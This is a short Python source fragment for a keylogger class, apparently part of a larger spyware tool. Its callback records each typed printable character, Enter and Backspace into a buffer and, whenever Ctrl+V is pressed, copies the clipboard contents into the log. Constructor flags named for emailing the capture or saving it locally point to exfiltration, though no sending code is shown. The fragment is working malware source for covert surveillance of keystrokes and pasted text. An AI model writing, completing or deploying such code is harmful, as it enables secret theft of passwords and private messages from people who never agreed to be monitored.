import pyperclip

class KeyloggerCore:

    def __init__(self, enviar_correo: bool, guardar_local: bool):
        self.enviar_correo = enviar_correo
        self.guardar_local = guardar_local
        self.buffer = ""           
        self.running = True         

    def callback(self, event):
      
        try:
            if event.Ascii == 22:
                pasted = pyperclip.paste()
                self.buffer += f"[PASTE: {pasted}]"
            else:
                if event.Ascii == 13:
                    self.buffer += "\n"
                elif event.Ascii == 8:
                    if len(self.buffer) > 0:
                        self.buffer = self.buffer[:-1]
                elif 32 <= event.Ascii <= 126:
                    self.buffer += chr(event.Ascii)

            buf_lower = self.buffer.lower()
            if buf_lower.endswith("exit"):
                self.buffer = self.buffer[:-4]
                self.running = False

        except Exception:
            pass
